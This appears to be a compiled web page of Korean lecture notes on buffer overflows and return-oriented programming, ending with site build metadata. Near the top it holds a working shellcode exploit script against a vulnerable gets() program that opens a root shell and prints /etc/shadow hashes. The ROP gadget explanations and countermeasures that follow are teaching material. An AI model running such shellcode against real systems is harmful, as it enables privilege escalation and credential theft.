<span class="line"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">{</span></span>
<span class="line">    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    chunk<span class="token punctuation">.</span>process <span class="token operator">=</span> showlen<span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Enter value: &quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">gets</span><span class="token punctuation">(</span>chunk<span class="token punctuation">.</span>inp<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    chunk<span class="token punctuation">.</span><span class="token function">process</span><span class="token punctuation">(</span>chunk<span class="token punctuation">.</span>inp<span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line">    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;buffer6 done\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh"><pre><code class="language-bash"><span class="line">$ <span class="token function">cat</span> attack3</span>
<span class="line"><span class="token comment">#!/bin/sh</span></span>
<span class="line"><span class="token comment"># implement global data overflow attack against program buffer6</span></span>
<span class="line">perl <span class="token parameter variable">-e</span> <span class="token string">&#39;print pack(&quot;H*&quot;,</span>
<span class="line">&quot;90909090909090909090909090909090&quot;</span>
<span class="line">.&quot;9090eb1a5e31c08846078d1e895e0889&quot;</span>
<span class="line">.&quot;460cb00b89f38d4e08bd560ccd80e8e1&quot;</span>
<span class="line">.&quot;fffff26f696e2f736820202020202020&quot;</span>
<span class="line">.&quot;409704080a&quot;);</span>
<span class="line">print &quot;whoami\\n&quot;;</span>
<span class="line">print &quot;cat /etc/shadow\\n&quot;;</span>
<span class="line">&#39;</span></span>
<span class="line"></span>
<span class="line">$ attack3 <span class="token operator">|</span> buffer6</span>
<span class="line">Enter value:</span>
<span class="line">root</span>
<span class="line">root:<span class="token variable">$1</span><span class="token variable">$4oImychST3RVS2E3OyNRGJGUF4o3</span>/:13347:0:99999:7:::</span>
<span class="line">daemon:*:11453:0:99999:7:::</span>
<span class="line"><span class="token punctuation">..</span>.</span>
<span class="line">nobody:*:11453:0:99999:7:::</span>
<span class="line">knoppix:<span class="token variable">$1</span><span class="token variable">$p2wziIMLs</span>/yVHPQuw5kvlUFJs3b9a/:13347:0:99999:7:::</span>
<span class="line"><span class="token punctuation">..</span>.</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="return-oriented-programming" tabindex="-1"><a class="header-anchor" href="#return-oriented-programming"><span>Return-Oriented Programming</span></a></h2><ul><li>개념 (Concept)</li><li>공격 방법 (Attack method)</li><li>대응책 (Countermeasures)</li><li>공격자는 <code>f(“foo”)</code>를 실행하고 싶지만... <ul><li><code>f()</code>가 libc에 없음.</li><li>또는 <code>f()</code>의 위치가 무작위화됨.</li></ul></li></ul><h2 id="rop-return-oriented-programming" tabindex="-1"><a class="header-anchor" href="#rop-return-oriented-programming"><span>ROP (Return-Oriented Programming)</span></a></h2><ul><li>악성 코드를 주입할 필요 없이 임의의(튜링 완전한) 계산 수행 <ul><li>라이브러리 함수 호출 필요 없음 (예: <code>system()</code>, <code>execve()</code>, ...)</li><li>원본 코드 수정 필요 없음. <ul><li>하지만 여전히 stack 내용(반환 주소 포함)을 변경해야 함.</li></ul></li></ul></li><li>ROP 공격은 다음 시스템에 적용될 수 있음. <ul><li>Intel x86 [Sha07]</li><li>ARM [Kor09]</li><li>The SPARC Machine [BRSS08]</li><li>Atmel AVR [FC08]</li><li>Z80 Voting Machines [CFK+09]</li><li>PowerPC [Lin09]</li></ul></li><li>Apple iPhone <ul><li>JailbreakMe [Hal10]</li><li>SMS 데이터베이스 탈취 [IW10]</li></ul></li><li>Desktop PCs <ul><li>Acrobat Reader [jdu10]</li><li>Adobe Flashplayer [Ado10]</li></ul></li><li>특수 목적 기계 <ul><li>Z80 voting machine [CFK+09]</li></ul></li></ul><h2 id="general-idea-of-rop" tabindex="-1"><a class="header-anchor" href="#general-idea-of-rop"><span>General Idea of ROP</span></a></h2><pre><code>┌──────────────────────────────────────────┐
│  Seq 1      Seq 2      Seq 3      Seq 4  │
│ ┌─────┐    ┌─────┐    ┌─────┐    ┌─────┐ │
│ │ins1 │ ┌─►│ins1 │ ┌─►│ins1 │ ┌─►│ins1 │ │
│ ├─────┤ │  ├─────┤ │  ├─────┤ │  ├─────┤ │
│ │ins2 │ │  │ins2 │ │  │ins2 │ │  │ins2 │ │
│ ├─────┤ │  ├─────┤ │  ├─────┤ │  ├─────┤ │
│ │ins3 │ │  │ret  │ │  │ins3 │ │  │ret  │ │
│ ├─────┤ │  └──┬──┘ │  ├─────┤ │  └─────┘ │
│ │ins4 │ │     └────┘  │ret  │ │          │
│ ├─────┤ │             └──┬──┘ │          │
│ │ret  │─┘                └────┘          │
│ └─────┘                                  │
└───────────────────Gadget─────────────────┘
</code></pre><ul><li>아이디어 <ul><li>(shellcode 주입, <code>lib</code> 함수 호출, 코드 수정 없이) 임의의 계산을 수행할 수 있음.</li></ul></li><li>접근 방식 <ul><li>전체 함수를 사용하는 대신 작은 명령어 시퀀스(예: <code>libc</code>의)를 사용함.</li><li>명령어 시퀀스는 2 ~ 5개의 명령어로 구성됨.</li><li>모든 시퀀스는 <code>ret</code> 명령어로 끝남.</li><li>명령어 시퀀스는 gadget으로 연결됨.</li><li>Gadget은 특정 작업(예: load, store, xor, branch)을 수행함.</li><li>이후, 공격자는 gadget들을 결합하여 원하는 동작을 강제함.</li></ul></li></ul><h2 id="finding-unintended-instruction-sequences" tabindex="-1"><a class="header-anchor" href="#finding-unintended-instruction-sequences"><span>Finding unintended instruction sequences</span></a></h2><ul><li>libc에 다음과 같은 명령어가 있다고 가정 <table><thead><tr><th>Byte values</th><th>Assembler</th><th>Comment</th></tr></thead><tbody><tr><td><code>b8 13 00 00 00</code></td><td><code>mov </code>0x13,%eax\`</td><td><code>/* move 0x13 to the %eax register */</code></td></tr><tr><td><code>e9 c3 f8 ff ff</code></td><td><code>jmp 3aae9</code></td><td><code>/* jump to (relative) address 3aae9 */</code></td></tr></tbody></table></li><li><code>b8</code> 대신 <code>00</code>부터 바이트 스트림을 해석하면, 다음과 같은 의도하지 않은 명령어 시퀀스를 얻을 수 있음. <table><thead><tr><th>Byte values</th><th>Assembler</th><th>Comment</th></tr></thead><tbody><tr><td><code>00 00</code></td><td><code>add %al, (%eax)</code></td><td><code>/* add register value of %al to the word pointed to by the %eax register */</code></td></tr><tr><td><code>00 e9</code></td><td><code>add %ch,%cl</code></td><td><code>/* add registers %cl and %ch */</code></td></tr><tr><td><code>c3</code></td><td><code>ret</code></td><td><code>/* return instruction */</code></td></tr></tbody></table></li></ul><h2 id="gadget-example-memory-load-1-4" tabindex="-1"><a class="header-anchor" href="#gadget-example-memory-load-1-4"><span>Gadget Example : Memory Load (1/4)</span></a></h2><pre><code>           Stack                                                           
    ┌──────────────────┐                                                   
    │ Return Address 2 │                                                   
    ├──────────────────┤                                                   
    │    0x8010AB8D    │                                                   
    ├──────────────────┤                                                   
SP--► Return Address 1 ├──┐                                                
    ├──────────────────┤  │                                                
    │     Pattern 2    │  │      Memory LOAD Gadget                        
    ├──────────────────┤  │   ┌───────────────────────────────────────────┐
    │                  │  │   │  ┌────────────┐  ┌──────────────────────┐ │
    │     Pattern 1    │  └───┼──►  pop %eax  │  │ movl 64(%eax), %eax  │ │
    │                  │      │  ├────────────┤  ├──────────────────────┤ │
    └──────────────────┘      │  │    ret     │  │         ret          │ │
                              │  └────────────┘  └──────────────────────┘ │
                              └───────────────────────────────────────────┘
    ┌──────────────────┐                                                   
    │    0xDEADBEEF    │          Value of %eax                             
    └────────▲─────────┘      ┌───────────────────┐                        
             │                │ 0 0 0 0 0 0 0 0 0 │                        
        0x8010ABCD            └───────────────────┘                        
</code></pre><ul><li>목표: (<code>0x8010ABCD</code>가 가리키는) 단어 <code>0xDEADBEEF</code>를 <code>%eax</code> register에 로드하기</li><li>Gadget 찾기 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">→</span></span></span></span> BoF 공격 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">→</span></span></span></span> Return <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"></span><span class="mrel">→</span></span></span></span> Sequence 1 시작 <ul><li>입력 값: Pattern 1 + Pattern 2 + <code>Ret_addr_1 + “\\x8D\\xAB\\x10\\x80” + Ret_addr_2</code></li></ul></li></ul><h2 id="gadget-example-memory-load-2-4" tabindex="-1"><a class="header-anchor" href="#gadget-example-memory-load-2-4"><span>Gadget Example: Memory Load (2/4)</span></a></h2><ul><li><code>0x8010AB8D</code>를 <code>%eax</code> register에 pop</li><li>목표: (<code>0x8010ABCD</code>가 가리키는) 단어 <code>0xDEADBEEF</code>를 <code>%eax</code> register에 로드하기</li></ul><h2 id="gadget-example-memory-load-3-4" tabindex="-1"><a class="header-anchor" href="#gadget-example-memory-load-3-4"><span>Gadget Example: Memory Load (3/4)</span></a></h2><ul><li>제어 흐름은 Sequence 1의 <code>ret</code> 명령어에 의해 Sequence 2로 이동함.</li><li>목표: (<code>0x8010ABCD</code>가 가리키는) 단어 <code>0xDEADBEEF</code>를 <code>%eax</code> register에 로드하기</li></ul><h2 id="gadget-example-memory-load-4-4" tabindex="-1"><a class="header-anchor" href="#gadget-example-memory-load-4-4"><span>Gadget Example: Memory Load (4/4)</span></a></h2><ul><li><code>0xDEADBEEF</code>를 <code>%eax</code> register로 move</li><li>목표: (<code>0x8010ABCD</code>가 가리키는) 단어 <code>0xDEADBEEF</code>를 <code>%eax</code> register에 로드하기</li></ul><h2 id="countermeasures" tabindex="-1"><a class="header-anchor" href="#countermeasures"><span>Countermeasures</span></a></h2><ul><li>반환 주소를 악의적인 수정으로부터 어떻게 보호할 것인가? <ul><li>컴파일러 기반 솔루션 <ul><li>반환 주소를 별도의 shadow stack에 백업함.</li></ul></li><li>하드웨어 지원 솔루션 <ul><li>Stack을 데이터 전용 및 호출/반환 주소 전용 부분으로 분리함.</li><li>호출/반환 stack에 대한 access control을 강제함.</li></ul></li><li>JIT-compiler 기반의 동적 바이너리 계측(Dynamic binary instrumentation) <ul><li>접근 방식: 실행 시간(runtime)에 명령어 블록을 새로운 명령어로 컴파일하여 계측 코드를 추가함 (JIT – Just In Time Compilation)</li></ul></li><li>Program shepherding <ul><li>반환 대상이 유효한 호출 사이트인지 확인함, 즉 반환은 <code>call</code> 명령어가 선행된 명령어를 대상으로 해야 함.</li></ul></li><li>반환 빈도 측정</li><li>ROPdefender <ul><li>별도의 shadow stack에 보관된 유효한 반환 주소와 각 반환 주소를 대조하여 확인함.</li></ul></li></ul></li></ul><h2 id="rop-without-returns-9" tabindex="-1"><a class="header-anchor" href="#rop-without-returns-9"><span>ROP without Returns [9]</span></a></h2><ul><li>특징 <ul><li>반환 주소를 보호하는 대응책을 우회할 수 있음.</li><li>Intel x86 및 ARM 등에 적용 가능함.</li><li>반환 명령어 없이 두 플랫폼 모두에 대한 튜링 완전한 gadget 세트 및 실용적인 공격 인스턴스화</li></ul></li><li>접근 방식 <ul><li>반환과 유사한(return-like) 시퀀스 사용</li><li>후보: 간접 점프(indirect jumps)</li><li>Intel 아키텍처: <code>jmp *%eax</code></li><li>ARM 아키텍처: <code>blx r3</code></li></ul></li><li>제약 사항 <ul><li><code>%eax</code>, <code>r3</code>, … register들을 미리 초기화해야 함.</li><li>Return은 stack pointer를 자동으로 업데이트하지만, 간접 점프는 그렇지 않음.</li></ul></li></ul><h2 id="rop-without-returns" tabindex="-1"><a class="header-anchor" href="#rop-without-returns"><span>ROP without Returns</span></a></h2><ul><li>반환과 유사한 시퀀스(Return-like Sequences) <ul><li>Intel <ul><li><code>pop %eax; jmp *%eax</code><ol><li>대상 주소를 <code>%eax</code>로 Pop</li><li><code>pop</code> 명령어는 stack pointer를 자동으로 4바이트 증가시킴(return과 유사)</li><li><code>%eax</code>에 저장된 주소로 Jump</li></ol></li></ul></li><li>ARM <ul><li>Pop-jump 시퀀스가 존재하지 않음.</li><li>Update-Load-Branch 시퀀스 사용 <ol><li>(Update) <code>adds r6,#4</code>: <code>r6</code>에 4바이트 추가</li><li>(Load) <code>ldr r5, [r6]</code>: 대상 주소를 <code>r5</code>로 Load</li><li>(Branch) <code>blx r5</code>: 대상 주소로 Branch</li></ol></li></ul></li><li>문제점 <ul><li>위 아키텍처들에서 반환과 유사한 시퀀스를 찾기 어려움.</li></ul></li></ul></li></ul>`,143)])])}const u=s(c,[["render",p]]),m=JSON.parse('{"path":"/cs/9.html","title":"09. Buffer Overflow","lang":"ko-KR","frontmatter":{},"git":{"updatedTime":1765873247000,"contributors":[{"name":"kmbzn","username":"kmbzn","email":"kmbzn24@gmail.com","commits":5,"url":"https://github.com/kmbzn"}],"changelog":[{"hash":"1575f6ad96bf7e9c912c484e30ece1bb27003476","time":1765873247000,"email":"kmbzn24@gmail.com","author":"kmbzn","message":"ai update"},{"hash":"fbc761248c4632f2dc6fe5fc2afee172914eca6c","time":1765654172000,"email":"kmbzn24@gmail.com","author":"kmbzn","message":"update security"},{"hash":"7952daf3d8b78c7329723f5ce140b6dd0952ba93","time":1764513939000,"email":"kmbzn24@gmail.com","author":"kmbzn","message":"update ai"},{"hash":"f81f9042e7888855a506f92261c74aaa2d86aa2a","time":1764305376000,"email":"kmbzn24@gmail.com","author":"kmbzn","message":"update npm"},{"hash":"9a225eeb65c4142b2102d90eba91afdc4501d305","time":1763650581000,"email":"kmbzn24@gmail.com","author":"kmbzn","message":"Refactor code structure for improved readability and maintainability"}]},"filePathRelative":"cs/9.md"}');export{u as comp,m as data};
